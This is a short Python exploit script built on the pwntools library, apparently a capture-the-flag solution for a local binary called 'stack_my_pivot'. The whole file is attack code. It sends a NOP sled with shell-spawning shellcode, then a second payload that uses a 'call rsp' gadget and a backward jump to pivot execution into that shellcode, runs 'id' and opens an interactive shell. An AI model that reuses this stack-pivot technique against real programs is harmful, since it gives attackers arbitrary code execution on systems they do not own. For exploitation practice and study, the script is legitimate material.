#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./stack_my_pivot')

shellcode = asm(shellcraft.sh())
first_input = b'\x90' * 10 + shellcode
first_input = first_input[:50].ljust(50, b'\x90')
p.send(first_input)

second_input = b'\x90' * 8
second_input += p64(0x4008e3)  # call rsp
second_input += b'\xeb\xc6'    # jmp short -0x3A
second_input += b'\x90' * (23 - len(second_input))
second_input += p32(0x40072e)
second_input += b'\x90'

p.send(second_input)

time.sleep(0.5)
p.sendline(b'id')
p.interactive()
